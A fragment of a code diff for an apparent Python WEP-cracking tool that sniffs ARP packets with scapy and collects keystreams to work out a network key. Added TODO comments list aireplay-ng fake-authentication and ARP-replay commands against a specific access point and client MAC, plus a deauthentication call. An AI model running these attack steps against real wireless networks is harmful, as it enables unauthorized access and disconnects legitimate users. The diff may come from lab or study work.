@@ -68,12 +68,21 @@ if __name__ == "__main__":
         exit(1)
     iface = args.interface
 
+    # TODO Start this on a new thread
     sniff(iface=iface, prn=arp_monitor_callback, store=0, stop_filter=stop_condition)
+
+    # TODO Start this on another thread
+    # aireplay-ng --fakeauth 0 -a C4:12:F5:7C:7C:0C -h d0:df:9a:8e:42:e9 wlp7s0
+    # aireplay-ng --arpreplay -b C4:12:F5:7C:7C:0C -h d0:df:9a:8e:42:e9 wlp7s0
+
+    # TODO Start this on another thread
+    # deauth(args.interface, int(args.count), args.bssid, args.target_mac)
     
     # scapy_cap = rdpcap('packets/arp_packet_dump.pcap')
     # for packet in scapy_cap:
     #     arp_monitor_callback(packet)
 
+    # Once all threads are terminated move on to this and the calculating of the key
     with open('keystreams.txt', 'w') as f:
         print(len(keystreams))
         for key, value in keystreams.items():
